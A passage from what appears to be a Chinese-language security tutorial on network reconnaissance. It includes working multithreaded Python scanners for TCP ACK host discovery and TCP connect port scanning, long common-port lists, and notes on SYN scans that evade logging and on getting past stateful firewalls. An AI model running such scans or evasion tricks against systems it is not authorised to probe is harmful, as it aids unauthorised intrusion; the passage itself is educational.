Please enter it again&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:	<span class="comment"># 读取文件</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">                ip = i.strip()			<span class="comment"># 调用多线程去发送数据包</span></span><br><span class="line">                t = Thread(target=scan, args=(ip,))</span><br><span class="line">                t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address:		<span class="comment">#判断用户输入的是为扫描网段</span></span><br><span class="line">        prefix = address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.&#x27;</span> + address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">1</span>] + <span class="string">&#x27;.&#x27;</span> + address.split(<span class="string">&quot;.&quot;</span>)[<span class="number">2</span>] + <span class="string">&quot;.&quot;</span>	<span class="comment"># 将用户输入的网段地址前三位以.作为分割提取出IP地址前缀</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">            ip = prefix + <span class="built_in">str</span>(i)	<span class="comment"># 结合IP地址前缀构成ip</span></span><br><span class="line">            t = Thread(target=scan, args=(ip,))	<span class="comment"># 多线程发送数据包</span></span><br><span class="line">            t.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP ACK SCAN end&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong>缺陷</strong>
很容易被基于状态的防火墙过滤，容易误判成非活跃主机。
<strong>改进</strong>
可以使用 TCP 协议的其他包，例如发 SYN 包，如果选择的端口是开放的，目标主机就会按照 TCP 三次握手的规定，发回一个 SYN/ACK 数据包，表示同意建立连接。如果这个端口关闭，目标主机就会拒绝这次连接，向本机发送一个 RST 数据包。不过这个阶段不在乎端口是否开放，只要收到响应数据包，就表示目标主机活跃。</p>
<h2 id="arp"><a class="markdownIt-Anchor" href="#arp"></a> arp</h2>
<p>当目标主机与本机处于同一网段的时候，使用 ARP 协议扫描技术就是最佳的选择。不仅速度最快，扫描结果也是最为精准的。这是因为没有任何安全措施会阻止正常的 ARP 请求。直接使用命令<code>arp -a</code>
<strong>缺陷</strong>
需要与目标主机处于同一网段，条件比较苛刻</p>
<h2 id="其他方式"><a class="markdownIt-Anchor" href="#其他方式"></a> 其他方式</h2>
<table>
<thead>
<tr>
<th>协议</th>
<th>方法</th>
<th>缺陷</th>
<th>改进</th>
</tr>
</thead>
<tbody>
<tr>
<td>UDP</td>
<td>当一个 UDP 端口收到一个 UDP 数据包时</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>若关闭，就会给源端发回一个 ICMP 端口不可达数据包。</li>
<li>若开放，就会忽略这个数据包，也就是将它丢弃而不返回任何信息。
| 扫描结果的可靠性比较低、扫描速度慢
需避开常见端口 | 选择值比较大的端口 |
| SCTP | 四次握手：客户端使用一个 INIT 报文发起一个连接，服务器端使用一个 INIT-ACK 报文进行应答；客户端使用一个 INIT 报文发起一个连接，服务器端使用一个 INIT-ACK 报文进行应答。</li>
<li>若活跃，目标主机会使用 INIT-ACK 报文进行应答。</li>
<li>若不可达，则不返回任何信息。
| 支持这个协议的主机不多 | 使用其他协议：D |
| IP | 遍历 IP 协议号，用来确定目标机支持哪些 IP 协议
若收到任意响应，则该协议的对应 | 易被检测出发出的数据包内容为空 | 随机填充数据 |
| DNS | 使用 DNS 逆解析 | 耗时长
目标主机需要有域名 | |</li>
</ul>
<h1 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h1>
<h2 id="tcp-syn-扫描半连接"><a class="markdownIt-Anchor" href="#tcp-syn-扫描半连接"></a> TCP SYN 扫描（半连接）</h2>
<p>本机向目标主机的一个端口发送请求连接的 SYN 数据包，而目标主机在接收到这个 SYN 数据包之后会根据不同情况做出不同应答：</p>
<table>
<thead>
<tr>
<th>应答</th>
<th>目标端口状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>SYN/ACK</td>
<td>open</td>
</tr>
<tr>
<td>RST</td>
<td>closed</td>
</tr>
<tr>
<td>没有应答</td>
<td>过滤</td>
</tr>
<tr>
<td>icmp 差错报文</td>
<td>过滤</td>
</tr>
</tbody>
</table>
<p>目标主机以 SYN/ACK 进行应答，本机可以在收到 SYN/ACK 后会发送 RST 包请求断开连接而不是 ACK 应答。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。注意此方法 Linux 中通过 NMAP，需要 root 权限。
<strong>缺陷</strong>
容易被基于状态的防火墙拦住</p>
<h2 id="tcp-connect-扫描全连接"><a class="markdownIt-Anchor" href="#tcp-connect-扫描全连接"></a> TCP connect 扫描（全连接）</h2>
<p>这种扫描方式其实和 SYN 扫描很像，只是这种扫描方式完成了 TCP 的三次握手。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PortScanner</span>(<span class="params">host, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        <span class="comment"># AF_INET 服务器之间网络通信</span></span><br><span class="line">        <span class="comment"># SOCK_STREAM 流式socket，for TCP</span></span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="comment"># 只有一个线程能成功地获取锁</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] PORT: %d open&quot;</span> % port)</span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产按频率排序的端口列表</span></span><br><span class="line">top50_list = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">465</span>,<span class="number">514</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">587</span>,<span class="number">646</span>,<span class="number">993</span>,<span class="number">995</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1433</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">2000</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">5060</span>,<span class="number">5666</span>,<span class="number">5900</span>,<span class="number">6001</span>,<span class="number">8000</span>,<span class="number">8008</span>,<span class="number">8080</span>,<span class="number">8443</span>,<span class="number">8888</span>,<span class="number">10000</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">49154</span>]</span><br><span class="line">top100_list = [<span class="number">7</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">389</span>,<span class="number">427</span>,<span class="number">443</span>,<span class="number">444</span>,<span class="number">465</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">543</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">587</span>,<span class="number">631</span>,<span class="number">646</span>,<span class="number">873</span>,<span class="number">990</span>,<span class="number">993</span>,<span class="number">995</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1027</span>,<span class="number">1028</span>,<span class="number">1110</span>,<span class="number">1433</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">1755</span>,<span class="number">1900</span>,<span class="number">2000</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">2717</span>,<span class="number">3000</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">3986</span>,<span class="number">4899</span>,<span class="number">5000</span>,<span class="number">5009</span>,<span class="number">5051</span>,<span class="number">5060</span>,<span class="number">5101</span>,<span class="number">5190</span>,<span class="number">5357</span>,<span class="number">5432</span>,<span class="number">5631</span>,<span class="number">5666</span>,<span class="number">5800</span>,<span class="number">5900</span>,<span class="number">6000</span>,<span class="number">6646</span>,<span class="number">7070</span>,<span class="number">8000</span>,<span class="number">8008</span>,<span class="number">8080</span>,<span class="number">8443</span>,<span class="number">8888</span>,<span class="number">9100</span>,<span class="number">9999</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">49153</span>,<span class="number">49154</span>,<span class="number">49155</span>,<span class="number">49156</span>]</span><br><span class="line">top1000_list = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">37</span>,<span class="number">42</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">70</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">106</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">125</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">146</span>,<span class="number">161</span>,<span class="number">163</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">222</span>,<span class="number">254</span>,<span class="number">255</span>,<span class="number">259</span>,<span class="number">264</span>,<span class="number">280</span>,<span class="number">301</span>,<span class="number">306</span>,<span class="number">311</span>,<span class="number">340</span>,<span class="number">366</span>,<span class="number">389</span>,<span class="number">406</span>,<span class="number">416</span>,<span class="number">425</span>,<span class="number">427</span>,<span class="number">443</span>,<span class="number">444</span>,<span class="number">458</span>,<span class="number">464</span>,<span class="number">481</span>,<span class="number">497</span>,<span class="number">500</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">524</span>,<span class="number">541</span>,<span class="number">543</span>,<span class="number">544</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">563</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">616</span>,<span class="number">625</span>,<span class="number">631</span>,<span class="number">636</span>,<span class="number">646</span>,<span class="number">648</span>,<span class="number">666</span>,<span class="number">667</span>,<span class="number">683</span>,<span class="number">687</span>,<span class="number">691</span>,<span class="number">700</span>,<span class="number">705</span>,<span class="number">711</span>,<span class="number">714</span>,<span class="number">720</span>,<span class="number">722</span>,<span class="number">726</span>,<span class="number">749</span>,<span class="number">765</span>,<span class="number">777</span>,<span class="number">783</span>,<span class="number">787</span>,<span class="number">800</span>,<span class="number">808</span>,<span class="number">843</span>,<span class="number">873</span>,<span class="number">880</span>,<span class="number">888</span>,<span class="number">898</span>,<span class="number">900</span>,<span class="number">901</span>,<span class="number">902</span>,<span class="number">911</span>,<span class="number">981</span>,<span class="number">987</span>,<span class="number">990</span>,<span class="number">992</span>,<span class="number">995</span>,<span class="number">999</span>,<span class="number">1000</span>,<span class="number">1001</span>,<span class="number">1007</span>,<span class="number">1009</span>,<span class="number">1010</span>,<span class="number">1021</span>,<span class="number">1022</span>,<span class="number">1023</span>,<span class="number">1024</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1027</span>,<span class="number">1028</span>,<span class="number">1029</span>,<span class="number">1030</span>,<span class="number">1031</span>,<span class="number">1032</span>,<span class="number">1033</span>,<span class="number">1034</span>,<span class="number">1035</span>,<span class="number">1036</span>,<span class="number">1037</span>,<span class="number">1038</span>,<span class="number">1039</span>,<span class="number">1040</span>,<span class="number">1041</span>,<span class="number">1042</span>,<span class="number">1043</span>,<span class="number">1044</span>,<span class="number">1045</span>,<span class="number">1046</span>,<span class="number">1047</span>,<span class="number">1048</span>,<span class="number">1049</span>,<span class="number">1050</span>,<span class="number">1051</span>,<span class="number">1052</span>,<span class="number">1053</span>,<span class="number">1054</span>,<span class="number">1055</span>,<span class="number">1056</span>,<span class="number">1057</span>,<span class="number">1058</span>,<span class="number">1059</span>,<span class="number">1060</span>,<span class="number">1061</span>,<span class="number">1062</span>,<span class="number">1063</span>,<span class="number">1064</span>,<span class="number">1065</span>,<span class="number">1066</span>,<span class="number">1067</span>,<span class="number">1068</span>,<span class="number">1069</span>,<span class="number">1070</span>,<span class="number">1071</span>,<span class="number">1072</span>,<span class="number">1073</span>,<span class="number">1074</span>,<span class="number">1075</span>,<span class="number">1076</span>,<span class="number">1077</span>,<span class="number">1078</span>,<span class="number">1079</span>,<span class="number">1080</span>,<span class="number">1081</span>,<span class="number">1082</span>,<span class="number">1083</span>,<span class="number">1084</span>,<span class="number">1085</span>,<span class="number">1086</span>,<span class="number">1087</span>,<span class="number">1088</span>,<span class="number">1089</span>,<span class="number">1090</span>,<span class="number">1091</span>,<span class="number">1092</span>,<span class="number">1093</span>,<span class="number">1094</span>,<span class="number">1095</span>,<span class="number">1096</span>,<span class="number">1097</span>,<span class="number">1098</span>,<span class="number">1099</span>,<span class="number">1102</span>,<span class="number">1104</span>,<span class="number">1105</span>,<span class="number">1106</span>,<span class="number">1107</span>,<span class="number">1110</span>,<span class="number">1111</span>,<span class="number">1112</span>,<span class="number">1113</span>,<span class="number">1117</span>,<span class="number">1119</span>,<span class="number">1121</span>,<span class="number">1122</span>,<span class="number">1123</span>,<span class="number">1126</span>,<span class="number">1130</span>,<span class="number">1131</span>,<span class="number">1137</span>,<span class="number">1141</span>,<span class="number">1145</span>,<span class="number">1147</span>,<span class="number">1148</span>,<span class="number">1151</span>,<span class="number">1154</span>,<span class="number">1163</span>,<span class="number">1164</span>,<span class="number">1165</span>,<span class="number">1169</span>,<span class="number">1174</span>,<span class="number">1183</span>,<span class="number">1185</span>,<span class="number">1186</span>,<span class="number">1192</span>,<span class="number">1198</span>,<span class="number">1201</span>,<span class="number">1213</span>,<span class="number">1216</span>,<span class="number">1217</span>,<span class="number">1233</span>,<span class="number">1236</span>,<span class="number">1244</span>,<span class="number">1247</span>,<span class="number">1259</span>,<span class="number">1271</span>,<span class="number">1277</span>,<span class="number">1287</span>,<span class="number">1296</span>,<span class="number">1300</span>,<span class="number">1309</span>,<span class="number">1310</span>,<span class="number">1322</span>,<span class="number">1328</span>,<span class="number">1334</span>,<span class="number">1352</span>,<span class="number">1417</span>,<span class="number">1433</span>,<span class="number">1443</span>,<span class="number">1455</span>,<span class="number">1461</span>,<span class="number">1494</span>,<span class="number">1500</span>,<span class="number">1503</span>,<span class="number">1521</span>,<span class="number">1524</span>,<span class="number">1533</span>,<span class="number">1556</span>,<span class="number">1580</span>,<span class="number">1583</span>,<span class="number">1594</span>,<span class="number">1600</span>,<span class="number">1641</span>,<span class="number">1658</span>,<span class="number">1666</span>,<span class="number">1687</span>,<span class="number">1700</span>,<span class="number">1717</span>,<span class="number">1718</span>,<span class="number">1719</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">1755</span>,<span class="number">1761</span>,<span class="number">1782</span>,<span class="number">1801</span>,<span class="number">1805</span>,<span class="number">1812</span>,<span class="number">1839</span>,<span class="number">1862</span>,<span class="number">1863</span>,<span class="number">1875</span>,<span class="number">1900</span>,<span class="number">1914</span>,<span class="number">1935</span>,<span class="number">1947</span>,<span class="number">1971</span>,<span class="number">1974</span>,<span class="number">1984</span>,<span class="number">1998</span>,<span class="number">1999</span>,<span class="number">2000</span>,<span class="number">2001</span>,<span class="number">2002</span>,<span class="number">2003</span>,<span class="number">2004</span>,<span class="number">2005</span>,<span class="number">2006</span>,<span class="number">2007</span>,<span class="number">2008</span>,<span class="number">2009</span>,<span class="number">2013</span>,<span class="number">2020</span>,<span class="number">2021</span>,<span class="number">2030</span>,<span class="number">2033</span>,<span class="number">2034</span>,<span class="number">2038</span>,<span class="number">2040</span>,<span class="number">2041</span>,<span class="number">2042</span>,<span class="number">2045</span>,<span class="number">2046</span>,<span class="number">2047</span>,<span class="number">2048</span>,<span class="number">2065</span>,<span class="number">2068</span>,<span class="number">2099</span>,<span class="number">2103</span>,<span class="number">2105</span>,<span class="number">2106</span>,<span class="number">2111</span>,<span class="number">2119</span>,<span class="number">2121</span>,<span class="number">2126</span>,<span class="number">2135</span>,<span class="number">2144</span>,<span class="number">2160</span>,<span class="number">2170</span>,<span class="number">2179</span>,<span class="number">2190</span>,<span class="number">2196</span>,<span class="number">2200</span>,<span class="number">2222</span>,<span class="number">2251</span>,<span class="number">2260</span>,<span class="number">2288</span>,<span class="number">2301</span>,<span class="number">2323</span>,<span class="number">2366</span>,<span class="number">2381</span>,<span class="number">2382</span>,<span class="number">2393</span>,<span class="number">2399</span>,<span class="number">2401</span>,<span class="number">2492</span>,<span class="number">2500</span>,<span class="number">2522</span>,<span class="number">2525</span>,<span class="number">2557</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">2607</span>,<span class="number">2638</span>,<span class="number">2701</span>,<span class="number">2710</span>,<span class="number">2717</span>,<span class="number">2725</span>,<span class="number">2800</span>,<span class="number">2809</span>,<span class="number">2811</span>,<span class="number">2869</span>,<span class="number">2875</span>,<span class="number">2909</span>,<span class="number">2920</span>,<span class="number">2967</span>,<span class="number">2998</span>,<span class="number">3000</span>,<span class="number">3003</span>,<span class="number">3005</span>,<span class="number">3006</span>,<span class="number">3011</span>,<span class="number">3013</span>,<span class="number">3017</span>,<span class="number">3030</span>,<span class="number">3052</span>,<span class="number">3071</span>,<span class="number">3077</span>,<span class="number">3128</span>,<span class="number">3168</span>,<span class="number">3211</span>,<span class="number">3221</span>,<span class="number">3260</span>,<span class="number">3268</span>,<span class="number">3283</span>,<span class="number">3300</span>,<span class="number">3306</span>,<span class="number">3322</span>,<span class="number">3323</span>,<span class="number">3324</span>,<span class="number">3333</span>,<span class="number">3351</span>,<span class="number">3367</span>,<span class="number">3369</span>,<span class="number">3370</span>,<span class="number">3371</span>,<span class="number">3389</span>,<span class="number">3404</span>,<span class="number">3476</span>,<span class="number">3493</span>,<span class="number">3517</span>,<span class="number">3527</span>,<span class="number">3546</span>,<span class="number">3551</span>,<span class="number">3580</span>,<span class="number">3659</span>,<span class="number">3689</span>,<span class="number">3703</span>,<span class="number">3737</span>,<span class="number">3766</span>,<span class="number">3784</span>,<span class="number">3800</span>,<span class="number">3809</span>,<span class="number">3814</span>,<span class="number">3826</span>,<span class="number">3827</span>,<span class="number">3851</span>,<span class="number">3869</span>,<span class="number">3871</span>,<span class="number">3878</span>,<span class="number">3880</span>,<span class="number">3889</span>,<span class="number">3905</span>,<span class="number">3914</span>,<span class="number">3918</span>,<span class="number">3920</span>,<span class="number">3945</span>,<span class="number">3971</span>,<span class="number">3986</span>,<span class="number">3995</span>,<span class="number">3998</span>,<span class="number">4000</span>,<span class="number">4001</span>,<span class="number">4002</span>,<span class="number">4003</span>,<span class="number">4004</span>,<span class="number">4005</span>,<span class="number">4045</span>,<span class="number">4111</span>,<span class="number">4125</span>,<span class="number">4129</span>,<span class="number">4224</span>,<span class="number">4242</span>,<span class="number">4279</span>,<span class="number">4321</span>,<span class="number">4343</span>,<span class="number">4443</span>,<span class="number">4444</span>,<span class="number">4445</span>,<span class="number">4449</span>,<span class="number">4550</span>,<span class="number">4567</span>,<span class="number">4662</span>,<span class="number">4848</span>,<span class="number">4899</span>,<span class="number">4998</span>,<span class="number">5000</span>,<span class="number">5001</span>,<span class="number">5002</span>,<span class="number">5003</span>,<span class="number">5009</span>,<span class="number">5030</span>,<span class="number">5033</span>,<span class="number">5050</span>,<span class="number">5054</span>,<span class="number">5060</span>,<span class="number">5080</span>,<span class="number">5087</span>,<span class="number">5100</span>,<span class="number">5101</span>,<span class="number">5120</span>,<span class="number">5190</span>,<span class="number">5200</span>,<span class="number">5214</span>,<span class="number">5221</span>,<span class="number">5225</span>,<span class="number">5269</span>,<span class="number">5280</span>,<span class="number">5298</span>,<span class="number">5357</span>,<span class="number">5405</span>,<span class="number">5414</span>,<span class="number">5431</span>,<span class="number">5440</span>,<span class="number">5500</span>,<span class="number">5510</span>,<span class="number">5544</span>,<span class="number">5550</span>,<span class="number">5555</span>,<span class="number">5560</span>,<span class="number">5566</span>,<span class="number">5631</span>,<span class="number">5633</span>,<span class="number">5666</span>,<span class="number">5678</span>,<span class="number">5718</span>,<span class="number">5730</span>,<span class="number">5800</span>,<span class="number">5801</span>,<span class="number">5810</span>,<span class="number">5815</span>,<span class="number">5822</span>,<span class="number">5825</span>,<span class="number">5850</span>,<span class="number">5859</span>,<span class="number">5862</span>,<span class="number">5877</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">5902</span>,<span class="number">5903</span>,<span class="number">5906</span>,<span class="number">5910</span>,<span class="number">5915</span>,<span class="number">5922</span>,<span class="number">5925</span>,<span class="number">5950</span>,<span class="number">5952</span>,<span class="number">5959</span>,<span class="number">5960</span>,<span class="number">5961</span>,<span class="number">5962</span>,<span class="number">5987</span>,<span class="number">5988</span>,<span class="number">5998</span>,<span class="number">5999</span>,<span class="number">6000</span>,<span class="number">6001</span>,<span class="number">6002</span>,<span class="number">6003</span>,<span class="number">6004</span>,<span class="number">6005</span>,<span class="number">6006</span>,<span class="number">6009</span>,<span class="number">6025</span>,<span class="number">6059</span>,<span class="number">6100</span>,<span class="number">6106</span>,<span class="number">6112</span>,<span class="number">6123</span>,<span class="number">6129</span>,<span class="number">6156</span>,<span class="number">6346</span>,<span class="number">6389</span>,<span class="number">6502</span>,<span class="number">6510</span>,<span class="number">6543</span>,<span class="number">6547</span>,<span class="number">6565</span>,<span class="number">6566</span>,<span class="number">6580</span>,<span class="number">6646</span>,<span class="number">6666</span>,<span class="number">6667</span>,<span class="number">6668</span>,<span class="number">6689</span>,<span class="number">6692</span>,<span class="number">6699</span>,<span class="number">6779</span>,<span class="number">6788</span>,<span class="number">6792</span>,<span class="number">6839</span>,<span class="number">6881</span>,<span class="number">6901</span>,<span class="number">6969</span>,<span class="number">7000</span>,<span class="number">7001</span>,<span class="number">7004</span>,<span class="number">7007</span>,<span class="number">7019</span>,<span class="number">7025</span>,<span class="number">7070</span>,<span class="number">7100</span>,<span class="number">7103</span>,<span class="number">7106</span>,<span class="number">7200</span>,<span class="number">7402</span>,<span class="number">7435</span>,<span class="number">7443</span>,<span class="number">7496</span>,<span class="number">7512</span>,<span class="number">7625</span>,<span class="number">7627</span>,<span class="number">7676</span>,<span class="number">7741</span>,<span class="number">7777</span>,<span class="number">7800</span>,<span class="number">7911</span>,<span class="number">7920</span>,<span class="number">7937</span>,<span class="number">7999</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8010</span>,<span class="number">8021</span>,<span class="number">8031</span>,<span class="number">8042</span>,<span class="number">8045</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8093</span>,<span class="number">8099</span>,<span class="number">8180</span>,<span class="number">8192</span>,<span class="number">8193</span>,<span class="number">8200</span>,<span class="number">8222</span>,<span class="number">8254</span>,<span class="number">8290</span>,<span class="number">8291</span>,<span class="number">8300</span>,<span class="number">8333</span>,<span class="number">8383</span>,<span class="number">8400</span>,<span class="number">8402</span>,<span class="number">8443</span>,<span class="number">8500</span>,<span class="number">8600</span>,<span class="number">8649</span>,<span class="number">8651</span>,<span class="number">8654</span>,<span class="number">8701</span>,<span class="number">8800</span>,<span class="number">8873</span>,<span class="number">8888</span>,<span class="number">8899</span>,<span class="number">8994</span>,<span class="number">9000</span>,<span class="number">9001</span>,<span class="number">9002</span>,<span class="number">9009</span>,<span class="number">9010</span>,<span class="number">9040</span>,<span class="number">9050</span>,<span class="number">9071</span>,<span class="number">9080</span>,<span class="number">9090</span>,<span class="number">9099</span>,<span class="number">9100</span>,<span class="number">9101</span>,<span class="number">9102</span>,<span class="number">9110</span>,<span class="number">9200</span>,<span class="number">9207</span>,<span class="number">9220</span>,<span class="number">9290</span>,<span class="number">9415</span>,<span class="number">9418</span>,<span class="number">9485</span>,<span class="number">9500</span>,<span class="number">9502</span>,<span class="number">9535</span>,<span class="number">9575</span>,<span class="number">9593</span>,<span class="number">9594</span>,<span class="number">9618</span>,<span class="number">9666</span>,<span class="number">9876</span>,<span class="number">9877</span>,<span class="number">9898</span>,<span class="number">9900</span>,<span class="number">9917</span>,<span class="number">9929</span>,<span class="number">9943</span>,<span class="number">9968</span>,<span class="number">9998</span>,<span class="number">9999</span>,<span class="number">10000</span>,<span class="number">10001</span>,<span class="number">10002</span>,<span class="number">10003</span>,<span class="number">10009</span>,<span class="number">10012</span>,<span class="number">10024</span>,<span class="number">10082</span>,<span class="number">10180</span>,<span class="number">10215</span>,<span class="number">10243</span>,<span class="number">10566</span>,<span class="number">10616</span>,<span class="number">10621</span>,<span class="number">10626</span>,<span class="number">10628</span>,<span class="number">10778</span>,<span class="number">11110</span>,<span class="number">11967</span>,<span class="number">12000</span>,<span class="number">12174</span>,<span class="number">12265</span>,<span class="number">12345</span>,<span class="number">13456</span>,<span class="number">13722</span>,<span class="number">13782</span>,<span class="number">14000</span>,<span class="number">14238</span>,<span class="number">14441</span>,<span class="number">15000</span>,<span class="number">15002</span>,<span class="number">15003</span>,<span class="number">15660</span>,<span class="number">15742</span>,<span class="number">16000</span>,<span class="number">16012</span>,<span class="number">16016</span>,<span class="number">16018</span>,<span class="number">16080</span>,<span class="number">16113</span>,<span class="number">16992</span>,<span class="number">17877</span>,<span class="number">17988</span>,<span class="number">18040</span>,<span class="number">18101</span>,<span class="number">18988</span>,<span class="number">19101</span>,<span class="number">19283</span>,<span class="number">19315</span>,<span class="number">19350</span>,<span class="number">19780</span>,<span class="number">19801</span>,<span class="number">19842</span>,<span class="number">20000</span>,<span class="number">20005</span>,<span class="number">20031</span>,<span class="number">20221</span>,<span class="number">20828</span>,<span class="number">21571</span>,<span class="number">22939</span>,<span class="number">23502</span>,<span class="number">24444</span>,<span class="number">24800</span>,<span class="number">25734</span>,<span class="number">26214</span>,<span class="number">27000</span>,<span class="number">27352</span>,<span class="number">27355</span>,<span class="number">27715</span>,<span class="number">28201</span>,<span class="number">30000</span>,<span class="number">30718</span>,<span class="number">30951</span>,<span class="number">31038</span>,<span class="number">31337</span>,<span class="number">32768</span>,<span class="number">32769</span>,<span class="number">32770</span>,<span class="number">32771</span>,<span class="number">32772</span>,<span class="number">32773</span>,<span class="number">32774</span>,<span class="number">32775</span>,<span class="number">32776</span>,<span class="number">32777</span>,<span class="number">32778</span>,<span class="number">32779</span>,<span class="number">32780</span>,<span class="number">32781</span>,<span class="number">32782</span>,<span class="number">32783</span>,<span class="number">32784</span>,<span class="number">33354</span>,<span class="number">33899</span>,<span class="number">34571</span>,<span class="number">34572</span>,<span class="number">35500</span>,<span class="number">38292</span>,<span class="number">40193</span>,<span class="number">40911</span>,<span class="number">41511</span>,<span class="number">42510</span>,<span class="number">44176</span>,<span class="number">44442</span>,<span class="number">44501</span>,<span class="number">45100</span>,<span 